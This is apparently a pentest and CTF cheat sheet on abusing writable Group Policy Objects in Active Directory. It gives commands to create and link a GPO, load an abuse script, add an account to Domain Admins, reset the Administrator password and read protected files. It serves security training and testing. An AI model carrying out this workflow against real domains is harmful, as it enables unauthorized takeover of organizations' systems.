# GPO Abuse for Privilege Escalation – General Reference

This document provides an overview of abusing writable Group Policy Objects (GPOs) to escalate privileges in an Active Directory environment. 
It also includes a cheat sheet of generalized commands that you can adapt for your engagements.

---

## 1. Overview

GPO abuse is a technique used during penetration testing (or CTF challenges) to leverage GPO editing permissions to inject malicious configurations. By modifying a GPO, an attacker can:
- Add their account to high-privilege groups (e.g., Domain Admins).
- Execute arbitrary commands on Domain Controllers or other systems.
- Change system settings via Group Policy Preferences.

**Key Points:**
- **Writable GPO:** The attacker must have permissions to create or edit GPOs.
- **GPO Linking:** The GPO must be linked to an Organizational Unit (OU) or the domain root so its settings are applied.
- **Propagation Delay:** Changes propagate on the next GPO refresh (typically 5–10 minutes) or on reboot/logon.
- **Execution Context:** GPO Preferences run under system or elevated contexts, which is why the abuse can be so powerful.

---

## 2. Attack Workflow

1. **Establish a Connection:**  
   Use a remote management tool (e.g., Evil-WinRM) to connect as a user with GPO editing privileges.

2. **Create a New GPO:**  
   Create a fresh GPO (e.g., "PrivEsc_GPO") to serve as a clean target for abuse.

3. **Link the GPO:**  
   Link the newly created GPO to the domain or target OU so that its settings are applied.

4. **Load Abuse Functions:**  
   Import an abuse script (e.g., a PowerShell script such as `PowerGPOAbuse.ps1`) that contains functions for modifying GPO settings.

5. **Modify the GPO to Escalate Privileges:**  
   Use a function from the abuse script to add your account to a privileged group (e.g., Domain Admins).  
   *Example (generalized):*
   ```powershell
   Add-GPOGroupMember -GPOIdentity "PrivEsc_GPO" -DomainGroup "PrivilegedGroup" -Member "YourAccount"
(Adjust the parameters based on your script’s help output.)

Force Policy Update:
Force a GPO refresh to propagate the changes immediately:

```
gpupdate /force
```

If forcing fails, wait 5–10 minutes for automatic propagation.

Verify Escalation:
Confirm that your account has been added to the privileged group:

```
whoami /groups | findstr /i "PrivilegedGroup"
```


Post-Exploitation:
Once you have escalated privileges, perform post-exploitation actions (e.g., resetting the Administrator password, accessing sensitive files).

3. Command Cheat Sheet
A. Establish a Remote Session
bash
Copy
# Example using Evil-WinRM (replace placeholders as needed)
evil-winrm -i <Target_IP_or_FQDN> -u <GPO_Editor_User> -r <REALM>
B. Create and Link a New GPO
powershell
Copy
New-GPO -Name 'PrivEsc_GPO' | New-GPLink -Target 'DC=<Your_Domain>,DC=<TLD>'
Verify:

powershell
Copy
Get-GPO -Name 'PrivEsc_GPO'
C. Import the Abuse Script
If the abuse script is stored locally:

powershell
Copy
Invoke-Expression (Get-Content -Path .\PowerGPOAbuse.ps1 -Raw)
Confirm functions are loaded:

powershell
Copy
Get-Command -Name Add-GPOGroupMember
D. Escalate Privileges via GPO Modification
Using the abuse function (adjust parameters as necessary):

powershell
Copy
Add-GPOGroupMember -GPOIdentity "PrivEsc_GPO" -DomainGroup "PrivilegedGroup" -Member "YourAccount"
Alternatively, some versions may use different parameters. Always check with:

powershell
Copy
Get-Help Add-GPOGroupMember -Detailed
E. Force a GPO Update
powershell
Copy
gpupdate /force
(Or wait 5–10 minutes for changes to propagate.)

F. Verify Privilege Escalation
powershell
Copy
whoami /groups | findstr /i "PrivilegedGroup"
G. Post-Exploitation: Reset Administrator Password and Retrieve Sensitive Data
powershell
Copy
net user Administrator <New_Admin_Password>
Then, open a session as Administrator and retrieve sensitive files (e.g., root flag):

powershell
Copy
type C:\Path\To\SensitiveFile.txt
If access is denied, consider copying the file to a user-writable location.

4. How the Attack Works
GPO Modification:
With GPO editing rights, an attacker creates or modifies a GPO to include a malicious setting—such as adding a user to a high-privilege group.

Propagation:
The modified GPO is linked to the domain or OU, so its settings are applied to target systems (e.g., Domain Controllers) on the next policy refresh or reboot.

Execution of Malicious Payload:
When the GPO refreshes, the malicious payload executes with elevated privileges, modifying system settings (e.g., group membership).

Privilege Escalation Outcome:
The attacker's account is elevated, granting them broad access and control over the domain, which can then be used for further exploitation.

